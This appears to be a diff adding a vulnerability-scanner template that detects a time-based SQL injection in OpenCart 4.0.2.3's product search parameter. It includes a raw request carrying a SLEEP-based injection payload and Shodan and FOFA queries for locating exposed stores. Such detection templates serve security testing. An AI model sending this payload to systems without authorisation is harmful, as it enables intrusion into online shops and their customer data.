@@ -1,0 +1,49 @@
+id: opencart-core-sqli
+
+info:
+  name: OpenCart Core 4.0.2.3 'search' - SQL Injection
+  author: Kazgangap
+  severity: high
+  description: |
+    Opencart allows SQL Injection via parameter 'search' in /index.php?route=product/search&search=. Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+  reference:
+    - https://www.exploit-db.com/exploits/51940
+    - https://cxsecurity.com/issue/WLB-2024040004
+  classification:
+    cpe: cpe:2.3:a:opencart:opencart:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 2
+    shodan-query: title:"OpenCart"
+    fofa-query: icon_hash="-1443008128"
+    product: opencart
+    vendor: opencart
+  tags: time-based-sqli,opencart,sqli
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(header, "OCSESSID=")'
+          - 'contains_any(body, "opencart.com", "OpenCart is open source", "content=\"OpenCart")'
+        condition: or
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 15s
+        GET /index.php?route=product/search&search=')+AND+(SELECT+8368+FROM+(SELECT(SLEEP(7)))uUDJ)--+Nabb HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=7'
+          - 'contains(body, "Nabb</title>")'
+          - 'status_code == 200'
+        condition: and
+# digest: 4a0a00473045022100e1bb1ca36dcc133d012589a3a5f13ea9f805ceece0206db802ac0f98b26815f60220117a6459b2304a4bcb6616323b4b89bffb9215ae557ec93c4b16bee70309a02d:922c64590222798bb761d5b6d8e72950
